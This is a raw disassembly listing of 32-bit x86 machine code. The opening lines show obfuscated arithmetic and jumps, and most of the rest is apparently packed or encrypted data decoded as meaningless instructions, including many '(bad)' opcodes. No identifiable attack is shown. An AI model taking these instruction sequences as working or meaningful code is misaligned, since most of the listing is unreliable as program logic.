  419060:	mov    DWORD PTR [ebp-0x58],edx
  419063:	mov    edx,DWORD PTR [ebp+0x8]
  419066:	mov    ebx,DWORD PTR [ebp-0x54]
  419069:	add    edx,0x64f898
  41906f:	or     edx,ebx
  419071:	mov    DWORD PTR [ebp-0x54],edx
  419074:	mov    edx,DWORD PTR [ebp+0x8]
  419077:	mov    ebx,DWORD PTR [ebp-0x50]
  41907a:	add    edx,ecx
  41907c:	xor    edx,ebx
  41907e:	mov    DWORD PTR [ebp-0x50],edx
  419081:	mov    edx,DWORD PTR [ebp+0x8]
  419084:	mov    ebx,DWORD PTR [ebp-0x4c]
  419087:	add    edx,edi
  419089:	and    edx,ebx
  41908b:	mov    DWORD PTR [ebp-0x4c],edx
  41908e:	mov    edx,DWORD PTR [ebp+0x8]
  419091:	mov    ebx,DWORD PTR [ebp-0x48]
  419094:	lea    edx,[ebx+edx*1+0x241fcdf]
  41909b:	mov    DWORD PTR [ebp-0x48],edx
  41909e:	mov    edx,DWORD PTR [ebp+0x8]
  4190a1:	mov    ebx,0xfa5e1524
  4190a6:	sub    ebx,edx
  4190a8:	add    ebx,DWORD PTR [ebp-0x44]
  4190ab:	mov    DWORD PTR [ebp-0x44],ebx
  4190ae:	mov    edx,DWORD PTR [ebp+0x8]
  4190b1:	xor    edx,eax
  4190b3:	add    edx,esi
  4190b5:	jne    0x41903e
  4190bb:	mov    edx,DWORD PTR [ebp-0x14]
  4190be:	mov    DWORD PTR [ebp+0x8],edx
  4190c1:	jmp    0x41b495
  4190c6:	mov    edx,DWORD PTR [ebp+0x8]
  4190c9:	mov    ebx,DWORD PTR [ebp-0x8]
  4190cc:	xor    edx,eax
  4190ce:	xor    ebx,eax
  4190d0:	sub    edx,ebx
  4190d2:	sub    edx,esi
  4190d4:	xor    edx,eax
  4190d6:	mov    DWORD PTR [ebp+0x8],edx
  4190d9:	jmp    0x41b438
  4190de:	adc    esp,DWORD PTR [eax-0x55]
  4190e1:	jl     0x419063
  4190e3:	mov    eax,0x95ec0084
  4190e8:	bound  ebp,QWORD PTR [ecx-0x4c]
  4190eb:	popa   
  4190ec:	mov    ds:0x7c1d331b,al
  4190f1:	cmp    DWORD PTR ds:0x9783835e,0x6b
  4190f8:	xchg   ebx,eax
  4190f9:	pop    DWORD PTR [eax-0x774bcd40]
  4190ff:	hlt    
  419100:	sbb    al,0x5d
  419102:	fstp   DWORD PTR [ecx]
  419104:	das    
  419105:	push   esi
  419106:	mov    edx,0xb6c3b2ea
  41910b:	pop    es
  41910c:	leave  
  41910d:	je     0x69b8ad25
  419113:	loop   0x4190c4
  419115:	pmulhw mm3,mm5
  419118:	retf   
  419119:	pop    edi
  41911a:	stos   BYTE PTR es:[edi],al
  41911b:	and    eax,0x5007395
  419120:	cmp    al,0x5f
  419122:	jmp    0xa1d9ad3b
  419127:	(bad)  
  419128:	push   ds
  419129:	sbb    ecx,ebp
  41912b:	icebp  
  41912c:	push   es
  41912d:	in     eax,0x18
  41912f:	scas   al,BYTE PTR es:[edi]
  419130:	push   ebp
  419131:	xchg   BYTE PTR [edx-0x4a],bl
  419134:	mul    ebp
  419136:	push   0xe6926aa3
  41913b:	sar    BYTE PTR ds:[edx+0x5d147b69],0x7f
  419143:	out    0x1e,eax
  419145:	add    dh,BYTE PTR [edx+esi*4-0x8613e1f]
  41914c:	clc    
  41914d:	les    esp,FWORD PTR [esi+0x41]
  419150:	dec    ecx
  419151:	arpl   WORD PTR [ebp+0x71364996],si
  419157:	sub    BYTE PTR [ebp+0x47858b6f],bh
  41915d:	cmp    edx,ebx
  41915f:	jle    0x419131
  419161:	les    eax,FWORD PTR [ebx]
  419163:	iret   
  419164:	xchg   ecx,eax
  419165:	call   0x175769f4
  41916a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41916b:	sahf   
  41916c:	outs   dx,DWORD PTR ds:[esi]
  41916d:	mov    ebx,0x747a6276
  419172:	ret    0x5c3a
  419175:	push   0xebd184dc
  41917a:	es ins BYTE PTR es:[edi],dx
  41917c:	or     al,0x22
  41917e:	fdivr  DWORD PTR [ebp+0x3692934f]
  419184:	mov    ebp,0xea0ef3ab
  419189:	push   ds
  41918a:	rol    DWORD PTR [esi+0x53],cl
  41918d:	fmul   QWORD PTR [ebp-0x8a586ff]
  419193:	loop   0x4191d0
  419195:	stos   BYTE PTR es:[edi],al
  419196:	xchg   ebx,eax
  419197:	jge    0x41912b
  419199:	mov    ebx,ebp
  41919b:	push   esp
  41919c:	adc    ebp,DWORD PTR [ecx]
  41919e:	mov    esp,0x796b821b
  4191a3:	dec    ecx
  4191a4:	sbb    ecx,ebp
  4191a6:	push   ebx
  4191a7:	and    DWORD PTR ds:[ebx+ebx*4],0xcd2ed84a
  4191af:	xor    ah,BYTE PTR [eiz*8-0x70dedde2]
  4191b6:	or     BYTE PTR [ebp-0x10],dh
  4191b9:	cmp    al,BYTE PTR [ebx+0x3a6c3395]
  4191bf:	dec    esi
  4191c0:	xchg   ebp,eax
  4191c1:	cmc    
  4191c2:	loope  0x4191b6
  4191c4:	stos   DWORD PTR es:[edi],eax
  4191c5:	pop    esi
  4191c6:	daa    
  4191c7:	rol    ebp,0x57
  4191ca:	lea    edx,[eax+0x1eef5d26]
  4191d0:	inc    esi
  4191d1:	adc    ah,cl
  4191d3:	push   ecx
  4191d4:	mov    cl,0x71
  4191d6:	iret   
  4191d7:	(bad)  
  4191d8:	pop    esi
  4191d9:	and    dh,BYTE PTR [esi+esi*8-0x3]
  4191dd:	push   esp
  4191de:	(bad)  
  4191e0:	sbb    al,0x63
  4191e2:	add    ah,BYTE PTR [eax-0x4f8c8859]
  4191e8:	cmc    
  4191e9:	push   es
  4191ea:	jmp    0x41924d
  4191ec:	repz mov esi,0xb1121e61
  4191f2:	sbb    eax,esi
  4191f4:	cmp    esp,DWORD PTR [edi+0x6d8155bb]
  4191fa:	xchg   ebp,eax
  4191fb:	add    DWORD PTR [ebp+0x77],eax
  4191fe:	fild   WORD PTR [ebp+0x1]
  419201:	shl    DWORD PTR [edx],0xc3
  419204:	retf   
  419205:	jbe    0x4191db
  419207:	imul   ebx,DWORD PTR [eax-0x17],0xfffffff5
  41920b:	test   al,0x30
  41920d:	das    
  41920e:	aam    0xed
  419210:	cmp    eax,0x43a54ea2
  419215:	ret    0xcb12
  419218:	mov    dh,0x42
  41921a:	enter  0x554d,0x73
  41921e:	or     BYTE PTR [edx],0x16
  419221:	inc    esi
  419222:	repnz (bad) 
  419224:	fistp  WORD PTR [edx+0x11]
  419227:	imul   eax,DWORD PTR [edi+0x7b],0xb5c63161
  41922e:	sub    eax,0x448a4300
  419233:	inc    edi
  419234:	jmp    0x4191ba
  419236:	leave  
  419237:	push   edx
  419238:	add    DWORD PTR [eax+0x3504ea96],0x19
  41923f:	adc    DWORD PTR [ecx],ecx
  419241:	stc    
  419242:	aad    0xec
  419244:	push   ebp
  419245:	jno    0x419238
  419247:	scas   eax,DWORD PTR es:[edi]
  419248:	xchg   edx,eax
  419249:	pop    ebp
  41924a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41924c:	mov    bh,0x8c
  41924e:	adc    esp,DWORD PTR cs:[ebp+0x12a4c52f]
  419255:	push   0xe
  419257:	and    ebp,ebp
  419259:	adc    esp,DWORD PTR [esi+0x65]
  41925c:	dec    eax
  41925d:	repz (bad) 
  41925f:	mov    bl,0xbb
  419261:	inc    edi
  419262:	enter  0x9ed,0x9d
  419266:	push   ds
  419267:	sbb    eax,0xcf45d0c9
  41926c:	out    0x50,eax
  41926e:	or     dh,ch
  419270:	(bad)  
  419271:	xor    ch,BYTE PTR [edi+0x2c]
  419274:	mov    dl,0x59
  419276:	mov    bh,0xaf
  419278:	fistp  DWORD PTR [edi-0x1a729ec5]
  41927e:	xor    bl,ah
  419280:	jle    0x4192da
  419282:	lods   eax,DWORD PTR ds:[esi]
  419283:	or     eax,0x2e533b29
  419288:	out    dx,al
  419289:	icebp  
  41928a:	or     al,0x8a
  41928c:	mov    cl,BYTE PTR [ebp+0x6e88cdb]
  419292:	mov    ebx,DWORD PTR [edx+edx*1-0x28393230]
  419299:	retf   
  41929a:	sbb    esp,0xffffff97
  41929d:	pop    esp
  41929e:	retf   
  41929f:	retf   
  4192a0:	arpl   sp,bp
  4192a2:	xor    eax,0xd5a06af
  4192a7:	pop    ebp
  4192a8:	add    al,0x5
  4192aa:	mov    gs,WORD PTR [edi]
  4192ac:	cli    
  4192ad:	push   0x77
  4192af:	mov    esi,edx
  4192b1:	lock mov ecx,0xa22d506a
  4192b7:	es lock or eax,0xbc58ce3
  4192be:	stos   DWORD PTR es:[edi],eax
  4192bf:	jno    0x419257
  4192c1:	mov    esp,0x8667aaa6
  4192c6:	sti    
  4192c7:	and    ch,BYTE PTR [ebx+0x3b]
  4192ca:	shld   edx,ebx,cl
  4192cd:	add    ecx,edi
  4192cf:	adc    bh,BYTE PTR [edi-0x7c]
  4192d2:	dec    ebx
  4192d3:	scas   al,BYTE PTR es:[edi]
  4192d4:	pop    esi
  4192d5:	inc    eax
  4192d6:	inc    esp
  4192d7:	sbb    eax,0x181c1072
  4192dc:	push   ebp
  4192dd:	in     eax,0x8d
  4192df:	adc    al,0x8e
  4192e1:	dec    esp
  4192e2:	iret   
  4192e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192e4:	mov    ebx,0x887e1593
  4192e9:	lods   eax,DWORD PTR ds:[esi]
  4192ea:	add    DWORD PTR [esp],ecx
  4192ed:	stc    
  4192ee:	(bad)  
  4192ef:	fsubr  st(5),st
  4192f2:	or     edi,DWORD PTR [eax-0x3a]
  4192f5:	test   ebx,edx
  4192f7:	xchg   esi,eax
  4192f8:	aaa    
  4192f9:	inc    esi
  4192fa:	pusha  
  4192fb:	pushf  
  4192fc:	mov    ebp,0xb5979e06
  419301:	mov    bl,0xdf
  419303:	xor    DWORD PTR [edi+0x24],esi
  419306:	jo     0x4192dc
  419308:	adc    DWORD PTR [esi+0x6689bcad],ebp
  41930e:	out    dx,al
  41930f:	rcr    DWORD PTR [edx+eiz*4],cl
  419312:	sbb    eax,0xf8c7854d
  419317:	xchg   ebp,eax
  419318:	ror    BYTE PTR [eax+0x8],1
  41931b:	mov    esp,0x2b7b3d0f
  419320:	push   ss
  419321:	and    eax,0x81253c17
  419326:	test   al,0x61
  419328:	dec    edx
  419329:	leave  
  41932a:	pop    ds
  41932b:	sahf   
  41932c:	pop    ss
  41932d:	jae    0x41932c
  41932f:	jnp    0x4192cc
  419331:	inc    eax
  419332:	and    al,0x1a
  419334:	push   edx
  419335:	fcmovu st,st(3)
  419337:	jae    0x41936b
  419339:	pop    ecx
  41933a:	jmp    0x329b:0xda79ddcc
  419341:	daa    
  419342:	pushf  
  419343:	int    0xba
  419345:	jg     0x4193b1
  419347:	jmp    0x419348
  419349:	push   eax
  41934a:	push   esi
  41934b:	fcom   st(3)
  41934d:	cwde   
  41934e:	inc    ebp
  41934f:	cmp    ecx,DWORD PTR [edx-0x7605b87b]
  419355:	lods   al,BYTE PTR ds:[esi]
  419356:	adc    eax,0xdc9f5917
  41935b:	pop    esp
  41935c:	pop    esp
  41935d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41935e:	push   ecx
  41935f:	mov    esi,es
  419361:	sub    dl,BYTE PTR ss:[ebx+0x5bf31d4f]
  419368:	mov    esi,0x8506a680
  41936d:	dec    ebx
  41936e:	or     dl,dh
  419370:	mov    eax,0x43cf7f6f
  419375:	call   0x28453fbb
  41937a:	push   ds
  41937b:	sar    BYTE PTR [edx-0x7e],1
  41937e:	mov    edx,0x3feea5ba
  419383:	jg     0x41933e
  419385:	and    eax,0x2a158424
  41938a:	lar    esp,bp
  41938d:	pop    ebx
  41938e:	cmp    ebx,esp
  419390:	repz pop ss
  419392:	ins    DWORD PTR es:[edi],dx
  419393:	xchg   esi,eax
  419394:	adc    bl,BYTE PTR [ebx+0x73afed08]
  41939a:	lds    ebp,FWORD PTR [edx-0x1c552c2a]
  4193a0:	popf   
  4193a1:	(bad)  
  4193a3:	ror    dl,1
  4193a5:	out    dx,al
  4193a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193a7:	jmp    0x3e0edd5b
  4193ac:	fcomip st,st(7)
  4193ae:	mov    ecx,DWORD PTR [edx-0x11aef936]
  4193b4:	mov    ebp,0xdf9d79eb
  4193b9:	lods   al,BYTE PTR ds:[esi]
  4193ba:	icebp  
  4193bb:	mov    BYTE PTR [edi-0x4465b43d],0x62
  4193c2:	loopne 0x419374
  4193c4:	scas   al,BYTE PTR es:[edi]
  4193c5:	push   edi
  4193c6:	loop   0x41936c
  4193c8:	iret   
  4193c9:	fst    DWORD PTR [ebx-0x45]
  4193cc:	sbb    eax,0x13a70a25
  4193d1:	pop    ss
  4193d2:	cli    
  4193d3:	cmp    dh,BYTE PTR [edi+edi*4+0x1ee9d9d5]
  4193da:	loop   0x41936a
  4193dc:	enter  0x4248,0x8d
  4193e0:	out    0xd1,eax
  4193e2:	push   esp
  4193e3:	add    eax,0x30aa8862
  4193e8:	jbe    0x41944b
  4193ea:	mov    ds:0x53f4d,al
  4193ef:	ds inc esp
  4193f1:	gs stos DWORD PTR es:[edi],eax
  4193f3:	loop   0x419420
  4193f5:	jecxz  0x419428
  4193f7:	push   esi
  4193f8:	pop    ecx
  4193f9:	jle    0x41939f
  4193fb:	int3   
  4193fc:	push   edx
  4193fd:	stc    
  4193fe:	stos   DWORD PTR es:[edi],eax
  4193ff:	lea    eax,[esi]
  419401:	jo     0x41943a
  419403:	(bad)  
  419404:	and    dh,BYTE PTR [edx+0x5]
  419407:	sub    esp,DWORD PTR [ebx-0x7ff899ee]
  41940d:	sbb    dh,dh
  41940f:	jb     0x419422
  419411:	stc    
  419412:	rcr    BYTE PTR [ebp+0x2621dffe],1
  419418:	cmp    al,0xbe
  41941a:	inc    eax
  41941b:	(bad)  
  41941c:	adc    eax,0xcce2d77a
  419421:	repnz xor eax,0x21e0cac9
  419427:	xor    al,0x19
  419429:	fadd   DWORD PTR [esi]
  41942b:	adc    bh,cl
  41942d:	stos   BYTE PTR es:[edi],al
  41942e:	bsr    ecx,DWORD PTR [edi+0x23]
  419432:	fcmovnb st,st(3)
  419434:	rol    dl,0x68
  419437:	xlat   BYTE PTR ds:[ebx]
  419438:	dec    ebx
  419439:	pcmpgtd mm4,mm4
  41943c:	into   
  41943d:	sbb    dl,BYTE PTR [edi-0x795e66de]
  419443:	mov    edx,0x94dd79e6
  419448:	mov    al,ds:0xc9032023
  41944d:	lahf   
  41944e:	push   ecx
  41944f:	mov    al,0x56
  419451:	stos   BYTE PTR es:[edi],al
  419452:	sub    al,0x10
  419454:	mov    ebp,0xba658e04
  419459:	mov    ah,0x13
  41945b:	aas    
  41945c:	imul   esp,DWORD PTR [esi-0x20],0xffffff96
  419460:	add    eax,0xe130fc9c
  419465:	and    al,0xd2
  419467:	pop    esp
  419468:	jmp    eax
  41946a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41946b:	loope  0x419400
  41946d:	leave  
  41946e:	mov    al,ds:0xa00a2edc
  419473:	dec    ebx
  419474:	call   0x66ae:0x290b9140
  41947b:	imul   ebx,DWORD PTR [ecx-0x1],0x8449e187
  419482:	jno    0x419425
  419484:	cwde   
  419485:	mov    ds:0xc2dfa2a6,eax
  41948a:	scas   eax,DWORD PTR es:[edi]
  41948b:	dec    esp
  41948c:	call   0x614b:0xc96860e0
  419493:	nop
  419494:	pop    ss
  419495:	jle    0x41943d
  419497:	add    cl,BYTE PTR [edx+0x0]
  41949a:	mov    cl,0xe3
  41949c:	nop
  41949d:	inc    esi
  41949e:	add    al,0x82
  4194a0:	sbb    eax,DWORD PTR [esi+0x3fdb078e]
  4194a6:	add    DWORD PTR [edx+0x6d7bc831],esp
  4194ac:	cld    
  4194ad:	sbb    BYTE PTR [edx],bl
  4194af:	mov    DWORD PTR [eax],edx
  4194b1:	xor    bh,BYTE PTR [edx+eiz*2-0x11]
  4194b5:	or     cl,0x9f
  4194b8:	and    esi,DWORD PTR [ebp-0x38]
  4194bb:	jnp    0x419528
  4194bd:	jbe    0x41949d
  4194bf:	mov    dl,0x49
  4194c1:	mov    DWORD PTR [esi+0x64],0x6aa91b7f
  4194c8:	pop    esi
  4194c9:	xchg   esp,eax
  4194ca:	mov    ah,0x6b
  4194cc:	sub    al,0xa1
  4194ce:	fldenv [edx-0x5c1e5389]
  4194d4:	and    DWORD PTR [ecx-0xce964a7],0xf
  4194db:	call   0x8af8:0x3903affb
  4194e2:	xchg   edx,eax
  4194e3:	xchg   edx,eax
  4194e4:	in     eax,0x70
  4194e6:	mov    WORD PTR [ebx+0xa149842],fs
  4194ec:	dec    esp
  4194ed:	fs push eax
  4194ef:	rcr    BYTE PTR [eax+0x2db9e543],cl
  4194f5:	stos   DWORD PTR es:[edi],eax
  4194f6:	jmp    0x31fd4daf
  4194fb:	imul   eax,DWORD PTR [ecx+0xe9105d4],0x3a1d80ba
  419505:	retf   0xa722
  419508:	ret    
  419509:	popf   
  41950a:	xor    BYTE PTR [edx-0x58],dl
  41950d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41950e:	gs pop edi
  419510:	sbb    edi,edx
  419512:	sub    al,0x17
  419514:	gs aam 0x8c
  419517:	les    ebp,FWORD PTR [esi-0x7d]
  41951a:	cmc    
  41951b:	add    al,0x34
  41951d:	mov    al,ds:0x214385a8
  419522:	cmc    
  419523:	popf   
  419524:	xor    BYTE PTR [ebx-0x6aa118fe],al
  41952a:	xchg   ebp,eax
  41952b:	or     esp,DWORD PTR [esi+0x1c901d08]
  419531:	inc    edx
  419532:	repnz or ch,BYTE PTR [esi+0x6bc0c284]
  419539:	dec    edx
  41953a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41953b:	imul   edx,DWORD PTR [edx+eiz*8],0x1e
  41953f:	loopne 0x419586
  419541:	aam    0x2c
  419543:	mov    bl,0xe
  419545:	mov    esp,0xc7339fcd
  41954a:	jo     0x4194fb
  41954c:	jg     0x41950e
  41954e:	jg     0x419545
  419550:	cwde   
  419551:	or     al,0xdb
  419553:	cmc    
  419554:	inc    ecx
  419555:	mov    DWORD PTR [ecx+0xd],ebx
  419558:	aas    
  419559:	repz push cs
  41955b:	cmp    edx,ebx
  41955d:	dec    ecx
  41955e:	adc    al,0x6b
  419560:	mov    ebx,DWORD PTR [ebp+0x6f52ff88]
  419566:	lahf   
  419567:	in     al,dx
  419568:	push   0x72686198
  41956d:	mov    ebx,0xf81de2e2
  419572:	call   0xf4f5:0xa34d4421
  419579:	xchg   DWORD PTR [esi-0x5379fd37],ecx
  41957f:	in     eax,0x55
  419581:	mov    eax,es:0x1346dd64
  419587:	push   edi
  419588:	aam    0xcf
  41958a:	cmp    ch,bl
  41958c:	mov    eax,ds:0x976ada83
  419591:	pop    ebx
  419592:	stos   DWORD PTR es:[edi],eax
  419593:	jmp    0xa1ff2a3
  419598:	push   ebx
  419599:	mov    ch,0x66
  41959b:	in     eax,dx
  41959c:	pop    es
  41959d:	aad    0x29
  41959f:	dec    eax
  4195a0:	sbb    ch,BYTE PTR [edi-0x3c]
  4195a3:	idiv   BYTE PTR [ebp-0x30]
  4195a6:	addr16 xchg ecx,eax
  4195a8:	push   esp
  4195a9:	xchg   ebx,eax
  4195aa:	fmul   st(1),st
  4195ac:	and    DWORD PTR es:[ecx],esp
  4195af:	dec    esp
  4195b0:	jge    0x4195cf
  4195b2:	or     eax,0x19754483
  4195b7:	jp     0x4195d9
  4195b9:	inc    esp
  4195ba:	xchg   ecx,eax
  4195bb:	jge    0x41962e
  4195bd:	es and esi,esi
  4195c0:	bound  esi,QWORD PTR [edx+0x60]
  4195c3:	xchg   ebx,eax
  4195c4:	popa   
  4195c5:	cmc    
  4195c6:	repz xor esi,DWORD PTR [edx]
  4195c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195ca:	ss loop 0x4195ac
  4195cd:	test   DWORD PTR gs:[ecx+0x7638f86b],0x3a79d127
  4195d8:	shr    DWORD PTR [ecx],1
  4195da:	sub    ch,BYTE PTR [edi+0x7b]
  4195dd:	xor    DWORD PTR [ecx+0x307a0e9c],0xffffffcf
  4195e4:	es sbb al,0x4a
  4195e7:	mov    DWORD PTR [ebx-0x6b7a7ae9],0x7d434a7c
  4195f1:	lea    eax,[ebp-0x9]
  4195f4:	push   ebp
  4195f5:	and    esp,esp
  4195f7:	mov    esi,0x816d9033
  4195fc:	(bad)  
  4195fd:	mov    ah,0xe4
  4195ff:	adc    al,0xe7
  419601:	and    BYTE PTR [edi-0x4],cl
  419604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419605:	aad    0x8a
  419607:	mov    al,ds:0xadc74b7e
  41960c:	std    
  41960d:	jo     0x4195c2
  41960f:	daa    
  419610:	mov    dl,0x9c
  419612:	(bad)  
  419613:	ret    
  419614:	dec    ecx
  419615:	push   0x5b
  419617:	pop    esp
  419618:	pop    edx
  419619:	test   BYTE PTR [ecx-0x42623d48],al
  41961f:	cmp    DWORD PTR ds:0x55c238c5,esp
  419625:	cdq    
  419626:	leave  
  419627:	ins    DWORD PTR es:[edi],dx
  419628:	test   al,0x2b
  41962a:	sbb    al,0xe5
  41962c:	or     al,0x75
  41962e:	aaa    
  41962f:	add    al,0x5f
  419631:	mov    edi,DWORD PTR [ebp-0x4466a8bc]
  419637:	xor    eax,0x63f2e657
  41963c:	and    dh,BYTE PTR [edi]
  41963e:	aas    
  41963f:	mov    DWORD PTR [edx+0x3eb79231],ebp
  419645:	dec    ecx
  419646:	mov    edi,0x1739dea1
  41964b:	int    0x39
  41964d:	lds    ebx,FWORD PTR [esi+0x373f6858]
  419653:	repz pop es
  419655:	jb     0x419693
  419657:	sub    BYTE PTR [eax+0x6b96e898],dh
  41965d:	aad    0x4a
  41965f:	pushf  
  419660:	jne    0x4196bc
  419662:	out    0xa7,al
  419664:	adc    ah,cl
  419666:	aam    0x19
  419668:	sbb    bh,BYTE PTR gs:[edx]
  41966b:	(bad)  
  41966d:	out    0x9,eax
  41966f:	rcl    BYTE PTR ds:0x247ee82e,cl
  419675:	ficom  DWORD PTR [eax]
  419677:	xchg   ebx,eax
  419679:	sub    al,0x7b
  41967b:	sar    BYTE PTR [esp+eiz*2+0x19731746],cl
  419682:	aam    0x52
  419684:	es pusha 
  419686:	inc    esi
  419687:	or     ah,bh
  419689:	adc    DWORD PTR [ecx+0x53],ebx
  41968c:	fnsave [esi-0x5a0d486e]
  419692:	mov    edi,DWORD PTR [esi-0x60]
  419695:	leave  
  419696:	jmp    0x41967c
  419698:	pop    esp
  419699:	sti    
  41969a:	aaa    
  41969b:	pop    ebp
  41969c:	pop    ebp
  41969d:	call   0x2d21ebf4
  4196a2:	loopne 0x41966c
  4196a4:	add    eax,0x6df99932
  4196a9:	pop    ss
  4196aa:	add    al,0x6b
  4196ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196ad:	out    dx,al
  4196ae:	imul   ecx,DWORD PTR [ebp-0x1f155d7a],0xffffffdb
  4196b5:	mov    DWORD PTR [esi-0x28],esi
  4196b8:	mov    ds:0x128ee65e,al
  4196bd:	add    DWORD PTR [edi-0x5e65ba35],esp
  4196c3:	pop    ecx
  4196c4:	je     0x419738
  4196c6:	test   DWORD PTR [eax],ebx
  4196c8:	jns    0x41972c
  4196ca:	jmp    0xe75c:0x4dd4413f
  4196d1:	(bad)  
  4196d2:	jnp    0x419706
  4196d4:	xchg   esi,eax
  4196d5:	mov    bl,0xa
  4196d7:	sub    DWORD PTR [eax-0x18386c36],edx
  4196dd:	mov    ch,0x9a
  4196df:	data16 cmc 
  4196e1:	imul   esp
  4196e3:	pop    edx
  4196e4:	sub    WORD PTR [eax-0x19501bd3],0xffc7
  4196ec:	jge    0x419738
  4196ee:	push   edi
  4196ef:	les    ebp,FWORD PTR [eax+esi*8]
  4196f2:	loope  0x419695
  4196f4:	fidivr DWORD PTR [eax-0x1c]
  4196f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196f8:	push   edi
  4196f9:	fadd   QWORD PTR [edi+0x674b6557]
  4196ff:	pusha  
  419700:	fsub   st,st(3)
  419702:	and    BYTE PTR [esi],dl
  419704:	xchg   esp,eax
  419705:	in     eax,0x42
  419707:	out    0xf0,eax
  419709:	aaa    
  41970a:	stc    
  41970b:	pop    ebp
  41970c:	add    edi,DWORD PTR [ecx-0x1]
  41970f:	push   ebx
  419710:	lods   al,BYTE PTR ds:[esi]
  419711:	mov    esi,0xd4df35cf
  419716:	inc    ebp
  419717:	ins    DWORD PTR es:[edi],dx
  419718:	mov    eax,ds:0xaef3421b
  41971d:	cmp    BYTE PTR [ecx-0x2d],ch
  419720:	cmp    bl,dl
  419722:	jo     0x4196fd
  419724:	dec    esi
  419725:	rol    ebp,cl
  419727:	std    
  419728:	sbb    BYTE PTR [edi+0x7e2a3c35],ah
  41972e:	xchg   ebp,eax
  41972f:	xchg   esi,eax
  419730:	fild   DWORD PTR [edx+0x5073c50a]
  419736:	xor    BYTE PTR [edx],bl
  419738:	mov    edx,0x7c39a36c
  41973d:	mov    eax,ds:0x77cbf8d
  419742:	jno    0x41978a
  419744:	in     eax,dx
  419745:	jae    0x4197bc
  419747:	pop    es
  419748:	div    ch
  41974a:	fnstsw WORD PTR [ebx-0x746797b7]
  419750:	inc    ebx
  419751:	sbb    eax,0x8200a666
  419756:	mov    ebx,0x299d18a0
  41975b:	push   es
  41975c:	ret    0xc2dd
  41975f:	ins    BYTE PTR es:[edi],dx
  419760:	fist   WORD PTR [ecx+eiz*1+0x652c45dc]
  419767:	adc    DWORD PTR [esp+eax*8-0x7b],0xffffff8f
  41976c:	idiv   ecx
  41976e:	rcr    DWORD PTR [ebp-0x32072aa6],0x89
  419775:	aas    
  419776:	jle    0x4197ec
  419778:	and    al,0x7c
  41977a:	dec    ebp
  41977b:	mov    bl,0xc3
  41977d:	cmp    eax,0xf858757f
  419782:	jbe    0x419789
  419784:	push   esp
  419785:	cld    
  419786:	cdq    
  419787:	mov    eax,ds:0x2ad46c23
  41978c:	adc    cl,BYTE PTR [eax+0x2764f18e]
  419792:	jmp    0xf855:0x3434828a
  419799:	pop    edi
  41979a:	or     BYTE PTR [esi+esi*1+0x13],dh
  41979e:	sbb    eax,0x9b07c994
  4197a3:	and    edi,DWORD PTR [edi]
  4197a5:	or     eax,0xa208581e
  4197aa:	test   al,0x9f
  4197ac:	dec    esi
  4197ad:	push   eax
  4197ae:	pop    eax
  4197af:	xchg   esi,eax
  4197b0:	repz sbb DWORD PTR [edi-0x9],edx
  4197b4:	adc    bh,BYTE PTR [edx]
  4197b6:	icebp  
  4197b7:	inc    esi
  4197b8:	inc    ecx
  4197b9:	into   
  4197ba:	mov    ah,0x15
  4197bc:	sub    ecx,0x5f317351
  4197c2:	jne    0x41974c
  4197c4:	mov    edx,0xc574aa17
  4197c9:	nop
  4197ca:	out    0x10,al
  4197cc:	hlt    
  4197cd:	adc    al,0x5b
  4197cf:	xor    edx,DWORD PTR [ecx+0x78]
  4197d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197d3:	pop    esp
  4197d4:	cwde   
  4197d5:	add    BYTE PTR [ebx-0x6ca9437b],0xe2
  4197dc:	inc    ebp
  4197dd:	and    bl,BYTE PTR [ebp+0x1b018dfc]
  4197e3:	push   ebx
  4197e4:	inc    esp
  4197e5:	int    0xac
  4197e7:	dec    edx
  4197e8:	in     eax,dx
  4197e9:	push   ebp
  4197ea:	ret    0xe2d6
  4197ed:	jbe    0x419799
  4197ef:	push   edi
  4197f0:	out    0xe1,eax
  4197f2:	dec    esp
  4197f3:	and    ebx,ebx
  4197f5:	in     al,dx
  4197f6:	push   ebp
  4197f7:	mov    bl,0x88
  4197f9:	std    
  4197fa:	popf   
  4197fb:	fld    DWORD PTR [esp+edx*2]
  4197fe:	sub    edi,DWORD PTR [eax-0x7b9a7356]
  419804:	cdq    
  419805:	xchg   ebx,eax
  419806:	inc    ebp
  419807:	inc    esi
  419808:	jns    0x4197d9
  41980a:	fist   WORD PTR [esi]
  41980c:	jecxz  0x4197d9
  41980e:	imul   edi,DWORD PTR [ebx],0x90ced5ee
  419814:	add    bl,cl
  419816:	or     esi,DWORD PTR [eax+0x465ef762]
  41981c:	(bad)  
  41981e:	dec    ebx
  41981f:	scas   eax,DWORD PTR es:[edi]
  419820:	rcl    DWORD PTR [eax+0x63eec2ff],1
  419826:	rcr    ebp,1
  419828:	sbb    BYTE PTR [esp+edx*2-0x160f4fef],bl
  41982f:	inc    ebp
  419830:	push   es
  419831:	ds pusha 
  419833:	rol    BYTE PTR [esi-0x39],0x11
  419837:	jo     0x419858
  419839:	adc    DWORD PTR [ecx],edx
  41983b:	xor    al,0x84
  41983d:	mov    edi,0x4862e00f
  419842:	outs   dx,DWORD PTR ds:[esi]
  419843:	dec    esp
  419844:	test   eax,0xe8b4ae89
  419849:	jb     0x419839
  41984b:	ss nop
  41984d:	popa   
  41984e:	xchg   esi,eax
  41984f:	adc    BYTE PTR [edx],ah
  419851:	jo     0x4197d6
  419853:	mov    ecx,0xef0fa340
  419858:	rcr    esp,0x30
  41985b:	je     0x419803
  41985d:	push   ebx
  41985e:	int    0x2b
  419860:	xchg   edx,eax
  419861:	lock inc edx
  419863:	inc    edx
  419864:	inc    edi
  419865:	rol    ah,1
  419867:	stos   DWORD PTR es:[edi],eax
  419868:	cli    
  419869:	mov    dl,0x7e
  41986b:	enter  0x806d,0x9f
  41986f:	cld    
  419870:	jmp    0x419853
  419872:	fsubp  st(4),st
